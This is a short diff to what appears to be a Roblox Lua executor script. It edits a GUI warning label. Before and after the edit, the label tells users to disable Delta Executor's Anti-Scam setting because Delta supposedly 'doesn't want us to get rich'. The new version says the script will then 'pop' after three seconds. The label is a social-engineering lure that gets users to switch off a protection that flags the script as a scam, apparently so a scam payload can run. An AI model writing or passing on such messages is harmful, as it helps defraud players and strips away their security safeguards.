@@ -18,7 +18,7 @@ Frame.Active = false
 Frame.Parent = ScreenGui
 
 --// Warning Text
-TextLabel.Text = "This only works in KRNL for now. If you're using Delta Executor, make sure to turn off the Anti-Scam setting (Delta blocks this script as a scam because they don't want us to get rich). After disabling it, rejoin the game and execute the script again."
+TextLabel.Text = "This only works in KRNL for now. If you're using Delta Executor, make sure to turn off the Anti-Scam setting (Delta blocks this script as a scam because they don't want us to get rich). After disabling it, wait 3 seconds then it should pop."
 TextLabel.TextWrapped = true
 TextLabel.Size = UDim2.new(1, -20, 0.75, -20)
 TextLabel.Position = UDim2.new(0, 10, 0, 10)
